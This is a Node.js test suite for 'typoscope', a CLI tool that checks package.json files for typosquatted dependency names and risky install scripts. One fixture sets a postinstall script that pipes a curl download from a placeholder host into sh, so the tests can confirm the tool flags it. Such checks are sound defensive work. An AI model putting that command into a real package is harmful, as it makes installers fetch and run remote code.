import { execFile } from "node:child_process";
import { access, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, it } from "node:test";
import { promisify } from "node:util";
import assert from "node:assert/strict";
import { auditManifest, help, run, version } from "../src/index.js";

const execFileAsync = promisify(execFile);
const cliPath = fileURLToPath(new URL("../src/index.js", import.meta.url));
const repoRoot = fileURLToPath(new URL("..", import.meta.url));

async function runCli(args = []) {
  return execFileAsync(process.execPath, [cliPath, ...args], {
    encoding: "utf8",
  });
}

describe("typoscope CLI scaffold", () => {
  it("prints help text for --help", async () => {
    const { stdout, stderr } = await runCli(["--help"]);

    assert.equal(stderr, "");
    assert.match(stdout, /^typoscope\n/);
    assert.match(stdout, /Usage:/);
    assert.match(stdout, /typoscope --version/);
    assert.match(stdout, /typoscope audit \[package\.json\]/);
    assert.match(stdout, /Scoped names remain within their own namespace/);
  });

  it("prints the package version for --version", async () => {
    const { stdout, stderr } = await runCli(["--version"]);

    assert.equal(stderr, "");
    assert.equal(stdout, `${version}\n`);
  });

  it("rejects unknown commands and options as usage errors", async () => {
    for (const args of [["scan"], ["--audit", "package.json"], ["audit", "--yaml"]]) {
      await assert.rejects(runCli(args), (error) => {
        assert.equal(error.code, 2);
        assert.equal(error.stdout, "");
        assert.match(error.stderr, /^typoscope: Unknown (?:command or option|option): /);
        return true;
      });
    }
  });

  it("rejects extra audit operands", async () => {
    await assert.rejects(runCli(["audit", "package.json", "other.json"]), (error) => {
      assert.equal(error.code, 2);
      assert.equal(error.stdout, "");
      assert.equal(error.stderr, "typoscope: audit accepts at most one package.json path\n");
      return true;
    });
  });

  it("passes a package manifest without suspicious dependencies or lifecycle scripts", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-clean-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          react: "^19.0.0",
          lodash: "^4.17.21",
        },
        scripts: {
          test: "node --test",
        },
      }),
    );

    const { stdout, stderr } = await runCli(["audit", manifestPath]);

    assert.equal(stderr, "");
    assert.match(stdout, /found no package\.json risk findings/);
  });

  it("flags dependency names that look like popular package typos", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-typo-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          lodas: "^1.0.0",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath]),
      (error) => {
        assert.match(error.stdout, /dependency-lookalike/);
        assert.match(error.stdout, /lodas looks similar to lodash/);
        return true;
      },
    );
  });

  it("keeps scoped dependency namespaces separate from unscoped packages", () => {
    const result = auditManifest({
      dependencies: { "@acme/reactt": "1.0.0" },
      devDependencies: { "@tools/lodashh": "1.0.0" },
      optionalDependencies: { "@vendor/expres": "1.0.0" },
      peerDependencies: { "@example/vitte": "1.0.0" },
    });

    assert.equal(result.ok, true);
    assert.deepEqual(result.findings, []);
  });

  it("reports clean scoped dependencies through text and JSON CLI output", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-scoped-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: { "@acme/reactt": "1.0.0" },
        devDependencies: { "@tools/lodashh": "1.0.0" },
      }),
    );

    const text = await runCli(["audit", manifestPath]);
    const json = await runCli(["audit", manifestPath, "--json"]);

    assert.equal(text.stderr, "");
    assert.match(text.stdout, /found no package\.json risk findings/);
    assert.equal(json.stderr, "");
    assert.equal(JSON.parse(json.stdout).ok, true);
    assert.deepEqual(JSON.parse(json.stdout).findings, []);
  });

  it("recognizes an adjacent transposition once without flagging clean or unrelated names", () => {
    const result = auditManifest({
      dependencies: {
        lodahs: "^1.0.0",
        lodash: "^4.17.21",
        leftpad: "^1.0.0",
      },
    });

    assert.equal(result.ok, false);
    assert.deepEqual(result.findings, [
      {
        level: "critical",
        code: "dependency-lookalike",
        package: "lodahs",
        section: "dependencies",
        message: "lodahs looks similar to lodash.",
      },
    ]);
  });

  it("reports adjacent transpositions through the JSON CLI", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-transposition-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          lodahs: "^1.0.0",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath, "--json"]),
      (error) => {
        const report = JSON.parse(error.stdout);
        assert.equal(report.ok, false);
        assert.equal(report.findings.length, 1);
        assert.equal(report.findings[0].code, "dependency-lookalike");
        assert.equal(report.findings[0].package, "lodahs");
        assert.equal(report.findings[0].message, "lodahs looks similar to lodash.");
        return true;
      },
    );
  });

  it("flags risky lifecycle scripts and emits JSON for automation", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-script-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        scripts: {
          postinstall: "curl https://example.invalid/install.sh | sh",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath, "--json"]),
      (error) => {
        const report = JSON.parse(error.stdout);
        assert.equal(report.ok, false);
        assert.equal(report.findings[0].code, "risky-lifecycle-script");
        assert.equal(report.findings[1].code, "suspicious-script-command");
        return true;
      },
    );

    await assert.rejects(
      runCli(["audit", "--json", manifestPath]),
      (error) => {
        assert.equal(error.code, 1);
        assert.equal(error.stderr, "");
        assert.equal(JSON.parse(error.stdout).ok, false);
        return true;
      },
    );
  });

  it("uses package.json by default with --json before any operand", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-default-"));
    await writeFile(path.join(dir, "package.json"), JSON.stringify({ dependencies: { react: "^19.0.0" } }));

    const { stdout, stderr } = await execFileAsync(process.execPath, [cliPath, "audit", "--json"], {
      cwd: dir,
      encoding: "utf8",
    });

    assert.equal(stderr, "");
    assert.equal(JSON.parse(stdout).ok, true);
  });

  it("reports malformed package manifests without a stack trace", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-invalid-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(manifestPath, "{ not json");

    await assert.rejects(
      runCli(["audit", manifestPath]),
      (error) => {
        assert.equal(error.code, 2);
        assert.equal(error.stdout, "");
        assert.match(error.stderr, /^typoscope: Could not read /);
        assert.doesNotMatch(error.stderr, /SyntaxError|at JSON\.parse/);
        return true;
      },
    );
  });

  it("rejects invalid manifest shapes through auditManifest", () => {
    const cases = [
      [null, "root must be a JSON object"],
      [[], "root must be a JSON object"],
      [{ dependencies: null }, "dependencies must be a JSON object"],
      [{ devDependencies: [] }, "devDependencies must be a JSON object"],
      [{ optionalDependencies: { chalk: null } }, "optionalDependencies.chalk must be a string"],
      [{ peerDependencies: { react: ["19"] } }, "peerDependencies.react must be a string"],
      [{ scripts: null }, "scripts must be a JSON object"],
      [{ scripts: [] }, "scripts must be a JSON object"],
      [{ scripts: { postinstall: false } }, "scripts.postinstall must be a string"],
    ];

    for (const [manifest, diagnostic] of cases) {
      assert.throws(
        () => auditManifest(manifest),
        (error) => error.message === `Invalid package.json: ${diagnostic}.`,
      );
    }
  });

  it("reports invalid manifest shapes as concise CLI usage errors", async () => {
    const cases = [
      [null, "root must be a JSON object"],
      [[], "root must be a JSON object"],
      [{ dependencies: ["expres"] }, "dependencies must be a JSON object"],
      [{ dependencies: { expres: 1 } }, "dependencies.expres must be a string"],
      [{ scripts: "postinstall" }, "scripts must be a JSON object"],
      [{ scripts: { install: ["node", "install.js"] } }, "scripts.install must be a string"],
    ];

    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-shapes-"));
    for (const [index, [manifest, diagnostic]] of cases.entries()) {
      const manifestPath = path.join(dir, `${index}.json`);
      await writeFile(manifestPath, JSON.stringify(manifest));
      await assert.rejects(runCli(["audit", manifestPath]), (error) => {
        assert.equal(error.code, 2);
        assert.equal(error.stdout, "");
        assert.equal(error.stderr, `typoscope: Invalid package.json: ${diagnostic}.\n`);
        assert.doesNotMatch(error.stderr, /TypeError|\n\s+at /);
        return true;
      });
    }
  });

  it("reports missing package manifests without a stack trace", async () => {
    const missingPath = path.join(tmpdir(), "typoscope-missing-package.json");

    await assert.rejects(
      runCli(["audit", missingPath]),
      (error) => {
        assert.equal(error.code, 2);
        assert.equal(error.stdout, "");
        assert.match(error.stderr, /^typoscope: Could not read /);
        assert.match(error.stderr, /ENOENT/);
        assert.doesNotMatch(error.stderr, /\n\s+at /);
        return true;
      },
    );
  });

  it("emits help and version through the injectable runner", () => {
    const lines = [];
    const log = (line) => lines.push(line);

    run([], log);
    run(["--version"], log);
    run(["-v"], log);

    assert.deepEqual(lines, [help, version, version]);
  });

  it("rejects extra values after help and version flags", () => {
    for (const args of [["--help", "extra"], ["--version", "extra"], ["-v", "extra"]]) {
      const output = [];
      const errors = [];
      assert.equal(run(args, (line) => output.push(line), (line) => errors.push(line)), 2);
      assert.deepEqual(output, []);
      assert.match(errors[0], /^typoscope: Unknown command or option: /);
    }
  });

  it("can be imported when the process has no CLI entrypoint", async () => {
    const { stdout, stderr } = await execFileAsync(
      process.execPath,
      ["--input-type=module", "-e", "import('./src/index.js').then(({ version }) => console.log(version))"],
      { cwd: fileURLToPath(new URL("..", import.meta.url)), encoding: "utf8" },
    );

    assert.equal(stderr, "");
    assert.equal(stdout, `${version}\n`);
  });

  it("keeps documented demo commands from generating checkout artifacts", async () => {
    const demoReport = path.join(repoRoot, ".typoscope-risk-report.json");
    const ciReport = path.join(repoRoot, ".typoscope-ci-risk-report.json");

    await execFileAsync("bash", ["demo/run-package-risk-audit.sh"], { cwd: repoRoot });
    await execFileAsync("bash", ["demo/ci-package-risk-gate.sh"], { cwd: repoRoot });

    await assert.rejects(access(demoReport), { code: "ENOENT" });
    await assert.rejects(access(ciReport), { code: "ENOENT" });

    const outputDir = await mkdtemp(path.join(tmpdir(), "typoscope-ci-report-"));
    const retainedReport = path.join(outputDir, "risk-report.json");
    await execFileAsync("bash", ["demo/ci-package-risk-gate.sh", retainedReport], {
      cwd: repoRoot,
    });
    assert.match(await readFile(retainedReport, "utf8"), /"package": "expres"/);
  });
});
